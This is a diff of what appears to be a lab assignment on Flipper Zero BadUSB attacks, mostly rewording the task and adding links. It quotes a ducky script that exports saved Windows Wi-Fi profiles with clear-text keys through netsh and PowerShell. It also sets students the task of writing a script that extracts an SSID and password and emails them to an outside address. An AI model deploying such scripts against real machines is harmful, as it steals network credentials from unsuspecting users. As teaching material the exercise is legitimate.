@@ -307,11 +307,11 @@ makepkg -si
 ```
 
 
-You are given a sample network file called networkfile.nmconnection which contains Wifi credentials for a network called 'Cross'
-Now that you're familiar with ducky scripts, your end goal should be a script which automatically extracts whole password and SSID for you from this file. Afterwards, it should send this password and SSID
+You are given a sample network file called [networkfile.nmconnection](misc/networkfile.nmconnection) which contains Wifi credentials for a network called 'Cross'
+Now that you're familiar with ducky scripts, your end goal is a script which automatically extracts whole password and SSID for you from this file. Afterwards, it should send this password and SSID
 over email to win10_9121@outlook.com!
 
-Flipper zero comes with a sample Wi-Fi credentials stealing script written in ducky language in following directory: _SD Card/badusb/Wifi-Stealer_ORG.txt_
+To aid you in this task, flipper zero comes with a sample Wi-Fi credentials stealing script written in ducky language in following directory: _SD Card/badusb/Wifi-Stealer_ORG.txt_
 The filename is: Wifi-Stealer_ORG.txt
 
 Contents of the file are shared below for your reference:
@@ -331,7 +331,7 @@ DELAY 500
 STRING cd C:\Users\$env:UserName\Desktop; netsh wlan export profile key=clear; Select-String -Path WiFi-* -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > 0.txt; del WiFi-*;exit
 ENTER
 ```
-Your job is to first download given configuration file on your virtual linux. Next, study ducky script, powershell and bad USB attacks to come up with a script that finds the configuration file for Wifi password, SSID and exports them over email as plain text.
+**Your job is to first download given configuration file ([download link](misc/networkfile.nmconnection)) on your virtual linux. Next, study ducky script, powershell and bad USB attacks to come up with a script that finds the configuration file for Wifi password, SSID and exports them over email as plain text.**
 
 
 **Recommended way to proceed:**
